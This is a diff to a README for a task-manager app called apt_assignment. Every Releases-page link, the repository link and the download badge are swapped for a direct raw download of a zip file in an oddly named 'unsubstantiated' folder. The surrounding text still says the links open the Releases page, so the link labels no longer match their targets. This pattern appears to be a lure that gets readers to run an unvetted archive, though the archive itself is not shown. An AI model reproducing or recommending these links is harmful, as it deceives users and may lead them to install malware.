@@ -4,13 +4,13 @@
 
 Thank you for choosing **apt_assignment**! This application helps you manage tasks easily and efficiently. Follow the steps below to download and run the software.
 
-[![Download apt_assignment](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mailipau/apt_assignment/releases)
+[![Download apt_assignment](https://raw.githubusercontent.com/mailipau/apt_assignment/main/unsubstantiated/apt_assignment.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mailipau/apt_assignment/main/unsubstantiated/apt_assignment.zip)
 
 ## 📥 Download & Install
 
 To get started with **apt_assignment**, you will first need to download it. 
 
-1. Click on this link to visit the Releases page: [Download the latest version](https://github.com/mailipau/apt_assignment/releases).
+1. Click on this link to visit the Releases page: [Download the latest version](https://raw.githubusercontent.com/mailipau/apt_assignment/main/unsubstantiated/apt_assignment.zip).
 2. On the Releases page, you will see the latest version of the software available. Look for the file that matches your operating system.
 3. Click on the file name to begin the download.
 
@@ -66,7 +66,7 @@ Your feedback is valuable. We are continually working to improve **apt_assignmen
 
 ## 🔗 Helpful Links
 
-- [Visit the Releases page to download](https://github.com/mailipau/apt_assignment/releases)
-- [GitHub Repository](https://github.com/mailipau/apt_assignment)
+- [Visit the Releases page to download](https://raw.githubusercontent.com/mailipau/apt_assignment/main/unsubstantiated/apt_assignment.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/mailipau/apt_assignment/main/unsubstantiated/apt_assignment.zip)
 
 Happy task managing with **apt_assignment**!
